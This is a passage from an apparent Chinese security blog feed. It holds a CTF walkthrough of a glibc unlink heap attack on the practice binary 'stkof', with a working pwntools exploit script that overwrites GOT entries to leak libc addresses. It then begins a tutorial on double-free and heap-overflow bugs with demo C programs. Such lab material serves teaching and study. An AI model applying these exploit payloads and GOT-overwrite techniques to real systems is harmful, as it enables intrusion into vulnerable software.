class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pws@pws:~/Desktop/workplace/heap_challenge/unlink$ file strof </span><br><span class="line">strof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, </span><br><span class="line">interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped</span><br></pre></td></tr></table></figure></li></ul><p>尝试运行一下libc.so.6,发现是2.23版本的glibc<br><img src="/images/heap_exp/2021-05-22-20-35-44.png" alt><br>checksec可以看到开启了nx和栈cookie，<br><img src="/images/heap_exp/2021-05-22-20-35-16.png" alt><br>考虑堆溢出漏洞<br>利用ida分析二进制，先看一眼使用的库函数<br><img src="/images/heap_exp/2021-05-22-20-28-31.png" alt><br>有malloc，所以重点关注对堆内存的操作</p><ul><li><p>找到漏洞</p><ul><li><p>我们可以简单推断出这是一个堆溢出的漏洞，我们看下malloc的逻辑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_400936()</span><br><span class="line">&#123;</span><br><span class="line">__int64 size; // [rsp+0h] [rbp-80h]</span><br><span class="line">char *v2; // [rsp+8h] [rbp-78h]</span><br><span class="line">char s[104]; // [rsp+10h] [rbp-70h] BYREF</span><br><span class="line">unsigned __int64 v4; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">v4 = __readfsqword(0x28u);</span><br><span class="line">fgets(s, 16, stdin);</span><br><span class="line">size = atoll(s);</span><br><span class="line">v2 = (char *)malloc(size);</span><br><span class="line">if ( !v2 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">(&amp;global_var)[++dword_602100] = v2;</span><br><span class="line">printf(&quot;%d\n&quot;, (unsigned int)dword_602100);</span><br><span class="line">return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc的大小是用户可控的，再观察操作堆空间的地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fgets(s, 16, stdin);</span><br><span class="line">n = atoll(s);</span><br><span class="line">ptr = (&amp;global_var)[v2];</span><br><span class="line">for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) )</span><br></pre></td></tr></table></figure><p>同样是用户可以操控写入的长度的，所以这个的确是一个堆溢出的漏洞。</p></li></ul></li><li><p>利用思路</p><ul><li>我们可以看到这个被溢出的堆的地址被写入了global_var这个数组里面，而且我们也可以连续触发两个malloc得到连续的chunk，因此符合我们的unlink利用条件。</li><li><p>首先需要两次malloc，我们同样尝试malloc的参数为0xa0,根据逆向结果我们输入1就可以触发分配的逻辑</p><ul><li><p>我们通过1 0xa0 连续3次得到了两个挨着的大小为0xb0的chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1 :0x0000000000e064e0      </span><br><span class="line">chunk2 :0x0000000000e06590</span><br></pre></td></tr></table></figure></li><li><p>现在我们要在chunk1中构造一个虚假的chunk，目的是骗过unlink的检查</p><ul><li>存储chunk1指针的地址为0x602150,我们要把0x602150-3*8 和 0x602150-2*8放到内存中，按照下面这个图<br><img src="/images/heap_exp/2021-05-23-15-28-37.png" alt></li><li>我们只需要根据程序的业务照做这件事就行了，首先得到chunk1的控制权,我们需要根据索引值得到，根据这个图<br><img src="/images/heap_exp/2021-05-23-17-23-42.png" alt><br>我们则可以看出来chunk1 相对于0x0000000000e064e0 0x602140这个数组开始地址的偏移为2，所以我们要输入2来获得对这个堆的控制权。</li></ul></li><li><p>现在我们要溢出chunk1，修改chunk2的的开头部分</p><ul><li><p>所以我们要得到需要写入的长度为0xa0 + 8*2 = 0xb0<br><img src="/images/heap_exp/2021-05-23-17-30-54.png" alt>   </p><ul><li>需要溢出chunk2的prev size和curent size两个字段，分别赋值为0xa0,和0xb0</li><li><p>因此我们构造的payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addr_of_chunk1_ptr = 0x602150</span><br><span class="line">fake_fd = addr_of_chunk1_ptr - 8 *3</span><br><span class="line">fake_bk = addr_of_chunk1_ptr - 8 * 2</span><br><span class="line">payload = (p64(0x0) + p64(0xa0) + p64(fake_fd) + p64(fake_bk)).ljust(0xa0,&apos;\x00&apos;) + p64(0xa0) + p64(0xb0)</span><br></pre></td></tr></table></figure></li><li><p>发送我们的数据之后的内存布局</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0xe064e0:       0x0000000000000000      0x00000000000000a0</span><br><span class="line">0xe064f0:       0x0000000000602138      0x0000000000602140</span><br><span class="line">...</span><br><span class="line">0xe06580:       0x00000000000000a0      0x00000000000000b0</span><br><span class="line">0xe06590:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>然后我们需要释放chunk2指针</p><ul><li>执行<code>remove(3)</code></li><li>我们再次观察全局数组的存储变量<br><img src="/images/heap_exp/2021-05-23-17-46-43.png" alt></li><li>可以看到我们存储heap指针的地方已经变为了0x602150 - 3 * 8 = 0x0x602138</li><li>因此我们已经实现了unlink操作，后面可以通过操作0x602138指针来重写0x602150中的内容，我们可以借助这个实现往任意地址写入任意内容的操作，但是如何利用这个获取root shell呢？</li></ul></li><li>要想获取root shell我们就必须能够调用类似system的这种函数<ul><li>我们目前拥有对内存空间任意读写的能力，那么只要我们能够知道system函数的地址，我们就可以把system函数地址写入到一个会被调用的函数，如free，strlen等等的got表中，但是关键问题是如何获得system函数地址</li></ul></li><li>如何获得system函数地址<ul><li>由于二进制文件中没有调用system，所以不能通过plt调用system，我们只能想办法获得system在libc中的地址，但是由于开启了随机化后，这个地址就是不是固定的，索性的是我们可以通过其他库函数的地址，通过相对偏移获得system函数地址</li><li>那么问题转化成了如何获取其他库函数，比如strlen函数的地址<ul><li>由于strlen函数被调用了，那么二进制中的got表中就包含strlen项，如果我们能够通过puts，printf，write等函数打印这个strlen在got表中的地址，就能够得到got表中包含strlen的真实地址。</li><li>那么如何让打印函数传入got表的内存地址呢<ul><li>首先挑选一个打印函数，比如我们可以使用puts函数来打印内存，因为puts比较简单，只需要一个参数</li><li>然后再物色一个拥有参数是用户可控的地址的函数，这个要结合二进制函数的业务，符合这个条件的函数有<ul><li><code>strlen((&amp;global_var)[v1]) &lt;= 3</code></li><li><code>free((&amp;global_var)[v1])</code></li></ul></li><li>让(&amp;global_var)[v1]的值为got表一个库函数的地址值，比如free函数got表地址0x602018<ul><li>就是往内存中写入0x602018，这个是可以实现的，因为我们已经可以通过unlink拿到了对0x0x602138之后内存的读写权限，并且可以写入任意内容。</li></ul></li><li>然后我们通过修改free或者strlen的got表，让他们的内容修改为puts函数的plt表的地址，那么以后在调用free或者strlen函数的时候就可以调用puts</li><li>unlink之后我们可以读写地址为0x0602138开始的内存,借助这个我们可以修改0x602150内存中的内容为strlen got表地址，，strlen在got表中的地址为0x602030。修改0x602148中的内容为free got表地址0x602018</li><li>我们可以通过业务逻辑发送payload为<code>p64(0) + p64(0) + p64(0x602018) + p64(0x602030)</code></li><li>发送payload之前0x602138中的内容为<ul><li><img src="/images/heap_exp/2021-05-23-19-25-19.png" alt></li></ul></li><li>发送payload之后的内容为<ul><li><img src="/images/heap_exp/2021-05-23-20-41-27.png" alt></li></ul></li><li>我们可以看到我们已经将strlen和free的got表地址写入到了数组中</li><li>我们再次利用业务逻辑就可以修改strlen的got表为puts.plt为0x400760<ul><li><img src="/images/heap_exp/2021-05-23-19-27-30.png" alt></li><li>这次的payload为p64(0x400760)</li><li>我们先看发送数据之前strlen got表中的内容为<ul><li><img src="/images/heap_exp/2021-05-23-19-30-09.png" alt></li><li>由于我们还没有调用这个函数，所以它的值为0</li></ul></li><li>然后我们看看发送完数据之后的内容为<ul><li><img src="/images/heap_exp/2021-05-23-20-09-18.png" alt></li><li>我们已经成功修改了strlen的got表，让他指向了puts</li></ul></li></ul></li><li>我们只需要调用strlen((&amp;global_var)[v1]) 让 (&amp;global_var)[v1]值为0x602018,就可以触发puts(0x602018)，而0x602018中存储的是真正的free函数的地址<ul><li>通过业务逻辑调用strlen，让v1为1的得到free的地址</li><li>得到free的地址为<br><img src="/images/heap_exp/2021-05-23-20-50-49.png" alt></li></ul></li></ul></li></ul></li><li>拿到free的地址之后，我们就可以进一步得到system函数的地址，后面的事情就比较简单了。</li></ul></li></ul></li></ul></li><li><p>我的exp代码，到返回free地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">target = process(&quot;./stkof&quot;, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6_1&quot;&#125;)</span><br><span class="line">elf = ELF(&quot;stkof&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6_1&quot;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(target, gdbscript=&apos;b *0x400b7a&apos;)</span><br><span class="line"></span><br><span class="line"># I/O Functions</span><br><span class="line">def add(size):</span><br><span class="line">  target.sendline(&quot;1&quot;)</span><br><span class="line">  target.sendline(str(size))</span><br><span class="line">  print target.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">def write_data(index, size, data):</span><br><span class="line">  target.sendline(&quot;2&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  target.sendline(str(size))</span><br><span class="line">  target.send(data)</span><br><span class="line">  print target.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">def remove(index):</span><br><span class="line">  target.sendline(&quot;3&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  print target.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">def view(index):</span><br><span class="line">  target.sendline(&quot;4&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  #print &quot;pillar&quot;</span><br><span class="line">  leak = target.recvline()</span><br><span class="line">  leak = leak.replace(&quot;\x0a&quot;, &quot;&quot;)</span><br><span class="line">  leak = u64(leak + &quot;\x00&quot;*(8-len(leak)))</span><br><span class="line">  print hex(leak)</span><br><span class="line">  #print &quot;men&quot;</span><br><span class="line">  print target.recvuntil(&quot;OK\n&quot;)</span><br><span class="line">  return leak</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr_of_chunk1_ptr = 0x602150</span><br><span class="line">fake_fd = addr_of_chunk1_ptr - 8 *3</span><br><span class="line">fake_bk = addr_of_chunk1_ptr - 8 * 2</span><br><span class="line">payload = (p64(0x0) + p64(0xa0) + p64(fake_fd) + p64(fake_bk)).ljust(0xa0,&apos;\x00&apos;) + p64(0xa0) + p64(0xb0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = p64(0) + p64(0) + p64(0x602018) + p64(0x602030)</span><br><span class="line">payload3 = p64(0x400760)</span><br><span class="line"></span><br><span class="line">add(0xa0)</span><br><span class="line">add(0xa0)</span><br><span class="line">add(0xa0)</span><br><span class="line">write_data(2,0xb0,payload)</span><br><span class="line">remove(3)</span><br><span class="line">write_data(2,8*4,payload2)</span><br><span class="line">write_data(2,8,payload3)</span><br><span class="line">view(1)</span><br></pre></td></tr></table></figure></li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>虽然这种unlink攻击并不能实现任意地址写入任意内容的攻击效果，但是如果符合这种一个数组中包含有一个指向堆的指针这种场景，并且这个堆可以溢出修改后面的chunk，即能够得到两个相邻的chunk，在free被溢出的chunk的时候，那么本来指向heap的指针就实际上指向的是数组，那么如果后续有用到heap指针的地方，就可以实现对数组的读写。</p><p>而实际上这个堆指针就是一个指向可以被用户读写的内存的指针，因此我们的利用思路可以是当有一个堆指针被写入了一个数组，我们通过溢出将存储这个堆指针的元素变成了存储数组的开头，然后我们通过业务代码继续操作这个被篡改了的“堆指针”去修改数组的内容，我们可以进一步修改存储这个“堆指针”的地方。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;unlink实例&quot;&gt;&lt;a href=&quot;#unlink实例&quot; class=&quot;headerlink&quot; title=&quot;unlink实例&quot;&gt;&lt;/a&gt;unlink实例&lt;/h2&gt;&lt;p&gt;通过这个实例先看看unlink攻击到底是什么样，注意这个例子是在2.26版本之前，需要不启用</summary>
      
    
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/categories/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>堆利用系列二：堆漏洞</title>
    <link href="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8B%C2%96%E5%A0%86%E6%BC%8F%E6%B4%9E/"/>
    <id>https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8B%C2%96%E5%A0%86%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-06-17T12:57:35.000Z</published>
    <updated>2021-06-17T13:27:17.361Z</updated>
    
    <content type="html"><![CDATA[<h2 id="堆漏洞"><a href="#堆漏洞" class="headerlink" title="堆漏洞"></a>堆漏洞</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们要首先熟悉几种常见的堆漏洞类型，分别是Double Free，堆溢出以及UAF漏洞。一般是借助这些漏洞实现对free chunk的内容进行改写，进而实现漏洞利用</p><h2 id="Double-Free漏洞"><a href="#Double-Free漏洞" class="headerlink" title="Double Free漏洞"></a>Double Free漏洞</h2><p>顾名思义，这种漏洞的原因是由于错误导致2次对同一个chunk连续释放了两次导致。我们可以通过一个动态调试一个例子，看看对于double free到底是如何影响堆的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;The goal of this is to show how we can edit a freed chunk using a Double Free bug.&quot;);</span><br><span class="line">    puts(&quot;Editing freed chunks will allow us to overwrite heap metadata, which is crucial to a lot of heap attacks.&quot;);</span><br><span class="line">    puts(&quot;However a bug to edit the heap metadata is often just one piece of the exploitation process.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So we start off by allocating three chunks of memory. Let&apos;s also write some data to them.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    char *ptr0, *ptr1, *ptr2;</span><br><span class="line"></span><br><span class="line">    ptr0 = malloc(0x30);</span><br><span class="line">    ptr1 = malloc(0x30);</span><br><span class="line">    ptr2 = malloc(0x30);</span><br><span class="line"></span><br><span class="line">    char *data0 = &quot;00000000&quot;;</span><br><span class="line">    char *data1 = &quot;11111111&quot;;</span><br><span class="line">    char *data2 = &quot;22222222&quot;;</span><br><span class="line"></span><br><span class="line">    memcpy(ptr0, data0, 0x8);</span><br><span class="line">    memcpy(ptr1, data1, 0x8);   </span><br><span class="line">    memcpy(ptr2, data2, 0x8);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk0: @ %p\t contains: %s\n&quot;, ptr0, ptr0);</span><br><span class="line">    printf(&quot;Chunk1: @ %p\t contains: %s\n&quot;, ptr1, ptr1);</span><br><span class="line">    printf(&quot;Chunk2: @ %p\t contains: %s\n\n&quot;, ptr2, ptr2);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now is where the bug comes in. We will free the same pointer twice (the first chunk pointed to by ptr0).\n&quot;);</span><br><span class="line">    printf(&quot;In between the two frees, we will free a different pointer. This is because in several different versions of malloc, there is a double free check \n(however in libc-2.27 it will hit the tcache and this will be fine).\n&quot;);</span><br><span class="line">    printf(&quot;It will check if the pointer being free is the same as the last chunk freed, and if it is the program will cease execution.\n&quot;);</span><br><span class="line">    printf(&quot;To bypass this, we can just free something in between the two frees to the same pointer.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr0); //-----------------------&gt; b1</span><br><span class="line">    free(ptr1);</span><br><span class="line">    free(ptr0); //-----------------------&gt; b2</span><br><span class="line">    </span><br><span class="line">    printf(&quot;Next up we will allocate three new chunks of the same size that we freed, and write some data to them. This will give us the three chunks we freed.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    char *ptr3, *ptr4, *ptr5;</span><br><span class="line"></span><br><span class="line">    ptr3 = malloc(0x30); //--------------&gt; b3</span><br><span class="line">    ptr4 = malloc(0x30);</span><br><span class="line">    ptr5 = malloc(0x30);</span><br><span class="line"></span><br><span class="line">    memcpy(ptr3, data0, 0x8);</span><br><span class="line">    memcpy(ptr4, data1, 0x8);   </span><br><span class="line">    memcpy(ptr5, data2, 0x8);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk3: @ %p\t contains: %s\n&quot;, ptr3, ptr3);  //-------------&gt; b4</span><br><span class="line">    printf(&quot;Chunk4: @ %p\t contains: %s\n&quot;, ptr4, ptr4);</span><br><span class="line">    printf(&quot;Chunk5: @ %p\t contains: %s\n\n&quot;, ptr5, ptr5);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So you can see that we allocated the same pointer twice, as a result of freeing the same pointer twice (since malloc will reuse freed chunks of similar sizes for performance boosts).\n&quot;);</span><br><span class="line">    printf(&quot;Now we can free one of the pointers to either Chunk 3 or 5 (ptr3 or ptr5), and clear out the pointer. We will still have a pointer remaining to the same memory chunk, which will now be freed.\n&quot;);</span><br><span class="line">    printf(&quot;As a result we can use the double free to edit a freed chunk. Let&apos;s see it in action by freeing Chunk3 and setting the pointer equal to 0x0 (which is what&apos;s supposed to happen to prevent UAFs).\n\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    free(ptr3);</span><br><span class="line">    ptr3 = 0x0;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk3: @ %p\n&quot;, ptr3);</span><br><span class="line">    printf(&quot;Chunk5: @ %p\n\n&quot;, ptr5);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So you can see that we have freed ptr3 (Chunk 3) and discarded it&apos;s pointer. However we still have a pointer to it. Using that we can edit the freed chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    char *data3 = &quot;15935728&quot;;</span><br><span class="line">    memcpy(ptr5, data3, 0x8);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk5: @ %p\t contains: %s\n\n&quot;, ptr5, ptr5);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Just like that, we were able to use a double free to edit a free chunk!\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们编译好这个源代码，然后使用GEF GDB进行调试，笔者倾向于配合IDA看反编译代码。我们在b1处打断点，在GDB中观察heap的情况:<br><img src="/images/heap_exp/2021-05-18-14-49-52.png" alt><br>可以看到我们已经分配了3个chunk去存储了3个字符串。<br><img src="/images/heap_exp/2021-05-18-14-53-35.png" alt><br>而此时各种bin和tcache上面还是什么都没有，因为我们并没有释放任何chunk。<br>为了避免double free的检测，需要在连续free之间添加一个free(ptr1)，这样就可以绕过double free的检测,我们在b2进行断点在观察heap的情况<br><img src="/images/heap_exp/2021-05-18-14-57-21.png" alt><br><img src="/images/heap_exp/2021-05-18-14-57-45.png" alt><br>我们可以发现tcache的0x40大小的链表已经存储了两个free chunk。<br>再通过在b3处下断点，观察double free给heap造成的影响：后来发现直接被检测出了double free<br><img src="/images/heap_exp/2021-05-18-15-41-57.png" alt><br>发现应该是glibc的版本太高了，已经无法这么简单地绕过double free了，根据源代码中的提示，glibc版本为2.27，参考<a href="https://blog.csdn.net/weixin_44864859/article/details/107237134" target="_blank" rel="noopener">关于Linux下更换不同glibc版本的解决方法</a>，使用glibc-all-in-one和patchelf对编译好的二进制文件直接替换其ld和libc的链接库地址，指向2.27版本的再次进行调试.</p><p>在b2处的堆内存情况为<br><img src="/images/heap_exp/2021-05-18-15-50-32.png" alt><br>在b3处的堆内存情况为<br><img src="/images/heap_exp/2021-05-18-15-51-09.png" alt><br>经过两次释放我们我可以看到addr=0x555555758670这个chunk被放到了tcache 0x40 大小的链表上两次</p><p>在b4处下断点，观察新的3个malloc返回地址是什么，以及现在的heap状态<br><img src="/images/heap_exp/2021-05-18-16-07-37.png" alt><br><img src="/images/heap_exp/2021-05-18-16-08-01.png" alt><br>这个地方实际上GEF貌似是有点问题的，tcache里面实际上已经没有chunk了，count为0，但是还是显示有一个，这应该是是一个bug。 </p><p>标准输出的结果<br><img src="/images/heap_exp/2021-05-18-16-12-39.png" alt><br>我们可以看出来，ptr3和ptr5实际上是返回的同一块地址。</p><p>因此当后面我们继续释放ptr3，并且把ptr3的值指向0x0,我们还是可以操作这个已经被释放的块的<br>根据标准输出的结果<br><img src="/images/heap_exp/2021-05-18-16-18-05.png" alt></p><p>我们先不用管能够修改已经被释放的空闲块中的内容到底有什么用，我们只考虑现在我们的Double free是可以实现这个目标的，当我把剩下的heapoveflow和UAF介绍完了再去解释修改空闲块到底有什么意义。</p><p>所以double free到能修改free chunk最简单抽象是首先两次free同一块地址，然后再连续两次malloc相同大小，然后再free其中一个，那么剩下那个指针指向的就是空闲块的chunk，而且还是可以被修改的。总结就是2次free，2次malloc，一次free，最终得到可用的空闲块指针。</p><h2 id="堆溢出漏洞"><a href="#堆溢出漏洞" class="headerlink" title="堆溢出漏洞"></a>堆溢出漏洞</h2><p>下面我们将通过一个堆溢出实例，观察堆溢出是如何触发了空闲块的融合，并且得到空闲块的控制权的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;The goal of this is to show how we can edit a freed chunk using a heap overflow bug to cause consolidation.&quot;);</span><br><span class="line">    puts(&quot;Editing freed chunks will allow us to overwrite heap metadata, which is crucial to a lot of attacks.&quot;);</span><br><span class="line">    puts(&quot;However a bug to edit the heap metadata is often just one piece of the exploitation process.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;We will start off by allocating four separate chunks of memory. The first three will be used for the heap consolidation.\n&quot;);</span><br><span class="line">    printf(&quot;The last one will be used to essentially separate this from the heap wilderness, and we won&apos;t do anything with it.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    unsigned long *ptr0, *ptr1, *ptr2, *ptr3, *ptr4, *ptr5;</span><br><span class="line"></span><br><span class="line">    ptr0 = malloc(0x500);</span><br><span class="line">    ptr1 = malloc(0x70);</span><br><span class="line">    ptr2 = malloc(0x500);</span><br><span class="line">    ptr3 = malloc(0x30);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk 0: %p\t Size: 0x500\n&quot;, ptr0);</span><br><span class="line">    printf(&quot;Chunk 1: %p\t Size: 0x70\n&quot;, ptr1);</span><br><span class="line">    printf(&quot;Chunk 2: %p\t Size: 0x500\n&quot;, ptr2);</span><br><span class="line">    printf(&quot;Chunk 3: %p\t Size: 0x30\n\n&quot;, ptr3);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now the reason why the first and second chunks are 0x500 in sizes, is because they will be the ones we are freeing. In the most recent libc versions (2.26 &amp; 2.27), there is a tcache mechanism.\n&quot;);</span><br><span class="line">    printf(&quot;If these chunks were much smaller, they would be stored in the tcaching mechanism and this wouldn&apos;t work. So I made them large so they wouldn&apos;t end up in the tcache.\n\n&quot;);</span><br><span class="line">    </span><br><span class="line">    printf(&quot;Start off by freeing ptr0, and clearing the pointer (which is often done when heap chunks get freed to avoid a use after free).\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr0);  //----------&gt;b1</span><br><span class="line">    ptr0 = 0;    //----------&gt;b2</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk 0: %p\n\n&quot;, ptr0);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now is where the heap overflow bug comes into play. We will overflow the heap metadata of ptr2. We can see that the size of ptr2 is 0x511.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Size of Chunk 2 @ %p\t Metadata Size: 0x%lx\n\n&quot;, ptr2, 